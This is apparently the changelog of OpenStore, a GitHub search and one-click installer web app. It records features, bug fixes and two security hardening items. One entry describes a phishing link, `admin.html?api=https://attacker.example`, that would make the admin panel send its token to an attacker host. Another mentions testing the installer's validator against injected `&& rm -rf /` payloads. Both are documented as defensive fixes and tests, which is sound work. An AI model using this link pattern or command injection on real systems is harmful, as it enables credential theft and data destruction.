# Changelog

High-level record of the work done on OpenStore, newest first. For the full commit-by-commit detail, see the git history.

## 2026-09-03 (later) — Admin panel token-exfiltration fix, manual update

### Fixed
- **Security: `admin.html` would send the admin token to any host named in its own `?api=` URL parameter**, with no allow-list. A link to the real Vercel domain (valid padlock, real domain) crafted as `admin.html?api=https://attacker.example` would make the page itself hand the visitor's `ADMIN_TOKEN` to the attacker's server the moment they typed it in — a textbook token-exfiltration phishing link, and the visitor would have no way to tell from the URL bar alone. Fixed with a strict allow-list (the production backend or `localhost`, for local dev only); any other value is ignored and never persisted to `localStorage`, even if one had been saved from an earlier, now-revoked visit. Reported by the project owner while reviewing the panel; verified fixed by simulating the exact attack against the running page.

### Added
- Manual (`/manual.html`, EN/ES): a new "Extra tools" section documenting favorites, compare, filters, light/dark theme, install history, and installing as a PWA — the visual guide previously only covered search → install and hadn't caught up with that feature batch.

## 2026-09-03 — Theme, favorites, compare, filters, history, PWA, admin panel

### Fixed
- **"Recently updated" sort surfaced near-zero-star junk** (e.g. searching "CRM" and sorting by "Actualizados" returned repos with 0–9 stars instead of established projects). GitHub's `sort=updated` alone has no quality floor; a `stars:>50` qualifier is now appended automatically when the user hasn't already added their own `stars:` filter.
- **Modal's own repo image could still show broken** — the earlier broken-image fix only covered the search-result Card; the install Modal has its own `<img>` and needed the same `FALLBACK_IMG` + `onError` handling.
- **Theme never actually persisted across reloads** — it was saved via a JSON-stringifying helper but read back as a raw string, so `"light"` (with the JSON quotes) never matched the raw comparison and the app silently fell back to dark on every reload. Fixed the write path to store a plain string.
- **`KineticGrid`'s animated background was hardcoded dark-only** (`#161618` fill, white-based line/dot/node colors) — turning on light mode made the whole full-viewport canvas paint dark over the new light UI. It now takes a `theme` prop and picks a light or dark palette (background, dots, lines, nodes, glow, ripple).
- `ExpandablePitch`'s "Leer más/Leer menos" button was hardcoded in Spanish regardless of the active UI language.

### Added
- **Real light/dark theme** across every component, driven by CSS custom properties (`:root` / `[data-theme="light"]`) instead of hardcoded hex colors; persisted to `localStorage` and applied before first paint (no flash) via an inline script in `index.html`.
- **Favorites**: bookmark any result, browse them in a dedicated view, persisted locally.
- **Compare**: select up to 3 repos and see them side-by-side (stars, forks, issues, language, license, tech stack).
- **Filters**: client-side language / license / "has an installer" filters over the current result set.
- **Install history**: every successful Smart Installer download is logged locally (title, repo, platform, date) and browsable from a History panel.
- **Accessibility**: a global `:focus-visible` outline for keyboard navigation.
- **PWA**: web app manifest, brand-colored icons (192/512/512-maskable/apple-touch), and a minimal service worker (network-first for navigation with an offline app-shell fallback, cache-first for static assets) — installable on desktop and mobile. Search itself still needs a live connection; only the shell works offline.
- **In-house, privacy-respecting analytics**: in-memory-only aggregate counters (total searches, cache hit rate, AI-processed vs. fallback ratio, top search terms) — no cookies, no per-user tracking, wiped on every restart. Exposed only via a token-gated `GET /api/admin/stats` endpoint (`503` until `ADMIN_TOKEN` is set), viewable through a small standalone dashboard at `/admin.html`. The Privacy Policy was updated to disclose exactly what this counts.
- pytest coverage for the admin endpoint's auth (missing token, wrong token, unconfigured server, correct token) and for the analytics counters.

### Changed
- Privacy Policy (`/privacidad.html`, EN/ES): rewrote the "what we store" and "what's in your browser" sections to reflect the new aggregate analytics and the new `localStorage` keys (theme, favorites, comparisons, history) — previously it said "no analytics" outright, which stopped being true.

## 2026-09-03 (earlier)

### Fixed
- **Root cause of every search failing on the deployed app**: a Vercel environment variable (`VITE_API_URL`) had a Markdown-formatted link (`[text](url)`) pasted into it instead of a plain URL, so every `fetch()` call threw `TypeError: Failed to parse URL`. Found by adding a visible error detail to the UI banner instead of a generic message, after ruling out DNS, browser extensions, antivirus, and general network flakiness across an extensive live debugging session.
- **AI quota exhausted after one search**: the originally-configured Gemini model had a **20-requests-per-day** free-tier cap — a single 12-repo search used more than half of it. Switched the default model to `gemini-flash-lite-latest` (load-tested at 12 concurrent calls, 0 failures).
- Sequential AI processing (one repo at a time with a fixed delay) made every search take 60–90+ seconds, long enough to trip platform/browser timeouts. Replaced with a concurrency-limited `asyncio.gather` — a 12-repo search now finishes in 15–30s.
- Any http(s) query (including GitHub repo/profile URLs) was routed through an optional Crawl4AI scraper that isn't installed anywhere it runs, so it always failed silently for URL searches. GitHub URLs now go through the fast, reliable GitHub API path instead.
- The LLM call had no timeout, so a single hung request could block an entire search indefinitely. Wrapped in `asyncio.wait_for`.
- A renamed environment variable (`AI_RATE_LIMIT_SECONDS` → `AI_CONCURRENCY`) left a stale `"4.5"` (a float) in Render's dashboard where the new int-only parser expected a whole number — would have crashed the process outright on the next restart. Added defensive `_env_int`/`_env_float` parsing that logs a warning and falls back to a default instead of raising.
- The "Desconocido"/language-unknown fallback text was hardcoded in Spanish even when the UI was in English.
- The favicon `<link>` pointed at `/vite.svg`, a file that only ever existed under `src/assets/` (never reachable from `public/`) — the tab always showed a generic icon instead of the app's own designed one.

### Added
- **Smart Installer**: a downloadable, per-repo installer script (`.bat` for Windows, one OS-detecting `.sh` for macOS/Linux) that checks for Git and the right runtime, self-heals missing tools via the native package manager (winget / Homebrew / apt / dnf / pacman), clones the repo to the Desktop, installs dependencies, and runs it. The AI may only pick a package manager from a closed enum — it never writes the literal install command — and the AI-extracted start command passes through a strict allow/deny-list validator before ever reaching a script (verified against fabricated `... && rm -rf /`-style payloads).
- Automatic fallback AI provider: if the primary provider (Gemini) fails for any reason, that specific repo is retried with an independently-configured second provider (Groq) before giving up.
- Search result caching (in-memory, 15 min TTL) — an identical (query, language, page, sort) request is served instantly without spending AI/GitHub quota.
- Per-IP rate limiting on the search endpoint.
- Search by GitHub profile URL / `@username` shorthand, in addition to plain keywords and repo URLs.
- "Load more results" instead of numbered pagination — all fetched results show on one screen; a button fetches the next batch of 12 from GitHub.
- Sort toggle (top stars / recently updated).
- Client-side auto-retry (up to 4 attempts, backing off) on transient network failures, with a visible "retrying…" state.
- Recent searches (saved locally) and a shareable `?q=` URL.
- Keyboard shortcut (`/`) to focus the search box; skeleton loading placeholders; a broken-image fallback for repo thumbnails.
- Bilingual (EN default / ES) UI and AI-generated content, translated from any source language.
- A visual "how it works" manual, an FAQ, Terms & Conditions, and a Privacy Policy — all bilingual, all explicit that the Smart Installer runs real third-party code.
- A same-origin diagnostic page (`/diagnostico.html`) for self-service connectivity troubleshooting, plus a minimal Vercel-hosted comparison endpoint (`/api/ping`) to isolate backend-specific vs. general connectivity issues.
- pytest tests for the installer's command-sanitization logic, and a GitHub Actions CI workflow running them (plus a frontend build check) on every push.
- Open Graph/Twitter meta tags, `robots.txt`, and `sitemap.xml`.

### Removed
- Dead code: `Loader.jsx`, `store-card.tsx`, the `styled-components` dependency, a redundant Tailwind CDN `<script>` tag, unused Vite/React demo assets, an unrelated leftover root-level `main.py` from a different experiment, and the numbered-pagination component (superseded by "Load more").
